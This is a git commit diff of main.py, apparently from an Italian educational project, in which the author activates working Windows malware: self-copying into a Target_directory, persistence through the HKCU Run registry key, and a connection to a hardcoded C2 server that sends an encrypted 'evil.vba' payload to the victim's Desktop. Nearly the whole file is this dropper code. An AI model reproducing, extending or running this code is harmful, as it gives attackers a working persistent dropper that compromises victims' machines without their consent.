2c42dad14c8acae83998e96ab31989d79f874223
angeloamoako <51134064+angeloamoako@users.noreply.github.com>
2023-01-16 12:58:48 +0100

    Update main.py
    - Rimosse info di debug per get_reg / set_reg
    - Resa dinamica la creazione del path destinazione del malware
    - Gestito il recupero del path al file corrente a seconda se  è eseguito come script .py oppure come .exe
    - Creazione di Target_directory direttamente dallo script

--- main.py
+++ main.py
@@ -4,6 +4,7 @@ import winreg   # utilizzato per accedere al Windows registry per ottenere persi
 import socket   # connessione verso il server
 import rsa      # generazione coppia di chiavi pubblica/privata
 import pickle   # serializzazione
+import sys
 from cryptography.fernet import Fernet
 BUFFER_SIZE = 512
 REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
@@ -17,7 +18,6 @@ def set_reg(name, value):
         winreg.CloseKey(registry_key)
         return True
     except WindowsError as we:
-        print(we)
         winreg.CloseKey(registry_key)
         return False
 
@@ -30,43 +30,55 @@ def get_reg(name):
         winreg.CloseKey(registry_key)
         return value
     except WindowsError as we:
-        print(we)
         winreg.CloseKey(registry_key)
         return None
 
 if __name__ == '__main__':
     # replica del malware nella cartella Target_directory
-    path_file_corrente = (os.path.abspath(__file__))
-    path_destinazione = os.path.dirname(os.path.abspath(__file__))
-    path_destinazione += "\\Target_directory\\malware.py"
+
+    if getattr(sys, 'frozen', False):
+        # If the application is run as a bundle, the PyInstaller bootloader
+        # extends the sys module by a flag frozen=True and sets the app
+        # path into variable _MEIPASS. sys.executable for one-file executables
+        path_file_corrente = sys.executable
+        print("Path_file_corrente: {}".format(path_file_corrente))
+        path_destinazione = os.path.dirname(sys.executable)
+        print(path_destinazione)
+    else:
+        path_file_corrente = (os.path.abspath(__file__))
+        path_destinazione = os.path.dirname(os.path.abspath(__file__))
+        print("path_destinazione: {}".format(path_destinazione))
+
+    if not os.path.exists(os.path.join(path_destinazione, "Target_directory") ):
+        os.makedirs(os.path.join(path_destinazione, "Target_directory"))
+
+    path_destinazione = os.path.join(path_destinazione, "Target_directory", "malware.exe")
 
     # replico il malware solamente quando ce n'è bisogno
-    # if not os.path.isfile(path_destinazione):
-    #     shutil.copyfile(path_file_corrente, path_destinazione)
+    if not os.path.isfile(path_destinazione):
+        shutil.copyfile(path_file_corrente, path_destinazione)
 
     # Garantisco la persistenza nella macchina della vittima
     # inserendo il percorso del malware nella chiave di registro
     # Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
     # ho scelto la chiave HKEY_CURRENT_USER perché così non devo avere diritti di admin
     # https://sensei-infosec.netlify.app/forensics/registry/persistence/2020/04/15/malware-persistence-registry.html
-    # TODO: valuta la creazione di una classe
 
     # Read value
-    # if get_reg('Test_privacy') is None:
-    #     set_reg('Test_privacy', path_file_corrente)
-    # else:
-    #     print("Chiave di registro già presente")
+    if get_reg('Test_privacy') is None:
+        set_reg('Test_privacy', path_file_corrente)
+    else:
+        print("Chiave di registro già presente")
 
     # connessione al server C2
-    ip_server = "192.168.1.15"  # l'ip è hardcoded ma esistono gli algoritmi di domain generation (DGA)
+    ip_server = "192.168.1.5"  # l'ip è hardcoded ma esistono gli algoritmi di domain generation (DGA)
     port_server = 65438
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     print("Tentativo di connessione al server C2...")
     server.connect((ip_server, port_server))
     print("Connessione al server C2 avvenuta con successo!")
-    #path_real_malware_from_C2 = r"C:\Users\angel\Desktop\chrome_proxy.exe"
-    # per Giordano: qui mettici pure l'indirizzo in cui vuoi che venga scaricato il malware che ti invia il server
-    path_real_malware_from_C2 = r"C:\Users\angel\Desktop\evil.vba"
+    # per Giordano: qui mettici pure il percorso in cui vuoi che venga scaricato il malware che ti invia il server
+    path_real_malware_from_C2 = r'C:\\Users\\' + os.getlogin() + r'\\Desktop\\evil.vba'
 
     # genero la coppia di chiavi pubblica-privata
     (publicKey, privateKey) = rsa.newkeys(1024)
@@ -84,14 +96,13 @@ if __name__ == '__main__':
         # leggo la dimensione del file da ricevere
         file_length = server.recv(BUFFER_SIZE).decode('utf8')
         file_length = int(file_length)
-        print("Dimensioni file: {}".format(file_length))
+        print("Dimensione file: {}".format(file_length))
         server.send("Ok".encode("utf8"))
         while True:
             bytes_read += server.recv(BUFFER_SIZE)
             if len(bytes_read) == file_length:
                 break
         malware_from_C2.write(symmetric_key.decrypt(bytes_read))
-
 
     print("Terminato!")
     server.close()
